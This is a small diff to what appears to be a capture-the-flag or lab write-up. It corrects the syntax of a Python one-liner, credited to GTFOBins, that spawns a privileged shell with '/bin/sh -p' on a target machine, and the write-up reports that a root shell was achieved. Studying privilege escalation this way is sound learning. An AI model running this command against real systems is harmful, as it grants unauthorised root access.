@@ -107,7 +107,7 @@ searching for Python on [gtfoBins](https://gtfobins.github.io/gtfobins/python/)
 
 Command: (on target machine)
 ```bash
-/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p"
+/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
 Root Shell Achieved.
